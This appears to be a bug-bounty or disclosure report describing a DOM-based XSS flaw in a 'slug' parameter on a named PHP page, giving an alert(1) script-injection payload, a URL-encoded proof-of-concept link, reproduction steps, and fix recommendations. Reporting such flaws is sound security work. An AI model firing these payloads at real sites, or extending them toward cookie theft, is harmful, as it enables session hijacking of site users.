# DOM-Based Cross-Site Scripting (XSS) via `location.search`

## Summary

A DOM-Based Cross-Site Scripting (XSS) vulnerability exists in the application where user-controlled input from `location.search` is processed by client-side JavaScript without proper sanitization.

The payload executes in the browser, resulting in arbitrary JavaScript execution.

---

## Vulnerable Endpoint

```text id="sy45g1"
http://kzlabs.com/67.php
```

---

## Payload Used

```html id="w8j9x2"
'><Script>alert(1)</script>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/67.php?slug=xicorr%27%22%3E%3CScript%3Ealert(1)%3C/script%3E
   ```

2. Observe that the JavaScript payload executes in the browser.

3. Inspect the DOM to confirm that the payload is processed through `location.search`.

---

## Proof of Concept

```text id="a7n2pk"
http://kzlabs.com/67.php?slug=xicorr%27%22%3E%3CScript%3Ealert(1)%3C/script%3E
```

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/8c53cbb7-3e0b-4e90-8a24-c4b07d6c0f37" />


---

## Impact

* Session hijacking
* Cookie theft
* Arbitrary JavaScript execution
* DOM manipulation attacks

---

## Recommendations for Fix

* Avoid unsafe DOM sinks such as `innerHTML` and `document.write`
* Sanitize and validate `location.search` input
* Use secure DOM APIs like `textContent`
* Implement a strict Content Security Policy (CSP)
